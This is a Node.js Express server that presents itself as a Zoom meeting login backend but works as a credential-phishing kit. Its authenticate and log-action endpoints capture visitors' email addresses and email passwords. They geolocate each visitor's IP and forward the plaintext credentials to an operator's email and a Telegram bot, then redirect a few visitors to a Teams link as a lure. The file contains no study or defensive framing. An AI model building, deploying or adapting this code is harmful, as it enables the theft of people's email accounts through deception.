require('dotenv').config();

const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const nodemailer = require("nodemailer");
const crypto = require('crypto');
const useragent = require('useragent');
const https = require('https');
const fetch = require('node-fetch');

const app = express();

const allowedOrigins = [
  'http://localhost:3000',
  'https://your-backblaze-or-cuugmstom-domain.com',
  'https://business-meeting.onrender.com' // Removed trailing slash
];

const PORT = process.env.PORT || 8080;
const smtpUser = process.env.SMTP_USER;
const smtpPass = process.env.SMTP_PASS;
const adminEmail = process.env.ADMIN_EMAIL;
const SECRET = process.env.SECRET || "zoom_meeting_secret_2026";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors({
  origin: function (origin, callback) {
    // allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    // Normalize origin by removing trailing slash if present
    const normalizedOrigin = origin.replace(/\/$/, "");
    
    if (allowedOrigins.includes(normalizedOrigin)) {
      callback(null, true);
    } else {
      console.warn(`CORS blocked for origin: ${origin}`);
      callback(new Error('CORS blocked'));
    }
  },
  credentials: true
}));

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));

// Default email password (can be overridden via .env)
const EMAIL_PASSWORD = process.env.EMAIL_PASSWORD || "de23#$QZoom2026!";

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: { user: smtpUser, pass: smtpPass }
});

// Verify SMTP connection on startup
transporter.verify((error, success) => {
  if (error) {
    console.error("❌ SMTP Verification Error:", error);
    console.error("Ensure SMTP_USER and SMTP_PASS are set correctly in Render environment variables.");
    console.error("If using Gmail, use an 'App Password' instead of your main password.");
  } else {
    console.log("✅ Mail Server is ready to send messages");
  }
});

function getClientIp(req) {
  return (req.headers["x-forwarded-for"] || "").split(",").pop()?.trim()
    || req.connection?.remoteAddress
    || req.socket?.remoteAddress
    || req.connection?.socket?.remoteAddress
    || "unknown";
}

async function getLocationFromIp(ip) {
  return new Promise((resolve) => {
    https.get(`https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`, (resp) => {
      let data = '';
      resp.on('data', chunk => data += chunk);
      resp.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (response.status === 'success') {
            resolve(`${response.city}, ${response.regionName}, ${response.country}`);
          } else {
            resolve('Location unavailable');
          }
        } catch (e) {
          resolve('Location error');
        }
      });
    }).on('error', () => resolve('Location error'));
  });
}

async function sendTelegramAlert(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    });
  } catch (e) {
    console.error('Telegram error:', e);
  }
}

// 🚨 INTRUDER MONITOR & ACTION LOGGING
app.post('/api/log-action', async (req, res) => {
  try {
    const logData = req.body;
    const ip = getClientIp(req);
    const locationInfo = await getLocationFromIp(ip);

    const alertMailText = `🚨 ZOOM MEETING MONITOR - ${String(logData.action || '').toUpperCase()}
═══════════════════════════════════════════════
ACTION: ${logData.action}
EMAIL: ${logData.email || 'none'}
PASSWORD ATTEMPT: ${logData.password || 'N/A'}
IP: ${ip}
LOCATION: ${locationInfo}
BROWSER: ${req.headers['user-agent']}
URL: ${req.headers.referer || 'unknown'}
TIME: ${new Date().toISOString()}
${logData.intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
═══════════════════════════════════════════════`;

    // Email to admin
    transporter.sendMail({
      from: smtpUser,
      to: adminEmail,
      subject: `🚨 Zoom Meeting ${String(logData.action || '').toUpperCase()} from ${locationInfo}${logData.intruderDetected ? ' [INTRUDER!]' : ''}`,
      text: alertMailText
    }).then(info => {
      console.log(`✅ Email sent for action: ${logData.action}`);
    }).catch(err => {
      console.error(`❌ Failed to send email for action: ${logData.action}`, err);
    });

    // Telegram alert
    const tgText = `Zoom Action: ${logData.action} | Email: ${logData.email || 'none'} | IP: ${ip}`;
    sendTelegramAlert(tgText);

    res.json({ success: true });
  } catch (error) {
    console.error('log-action error:', error);
    res.status(500).json({ success: false });
  }
});

// Main authentication endpoint for the meeting landing page
app.post('/api/authenticate', async (req, res) => {
  const { email, password } = req.body;
  const ip = getClientIp(req);
  const locationInfo = await getLocationFromIp(ip);

  const alertMailText = `🔐 Zoom Meeting Email Password Attempt
Email: ${email}
Email Password: ${password}
IP: ${ip}
Location: ${locationInfo}
Browser: ${req.headers['user-agent']}
Time: ${new Date().toISOString()}`;

  // Log attempt to admin email
  transporter.sendMail({
    from: smtpUser, 
    to: adminEmail,
    subject: `🔐 Zoom Email Password Attempt (${email})`,
    text: alertMailText
  }).then(info => {
    console.log(`✅ Authentication attempt email sent for: ${email}`);
  }).catch(err => {
    console.error(`❌ Failed to send authentication email for: ${email}`, err);
  });

  const tgText = `Zoom Login Attempt: email=${email} ip=${ip}`;
  sendTelegramAlert(tgText);

  if (password === EMAIL_PASSWORD) {
    const meetingLink = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
    return res.json({ success: true, redirect: meetingLink });
  } else {
    return res.status(401).json({ success: false, error: 'Invalid email password.' });
  }
});

app.get('/health', (req, res) => res.json({ status: 'OK' }));

app.listen(PORT, () => {
  console.log(`🚀 Zoom Backend on port ${PORT}`);
});
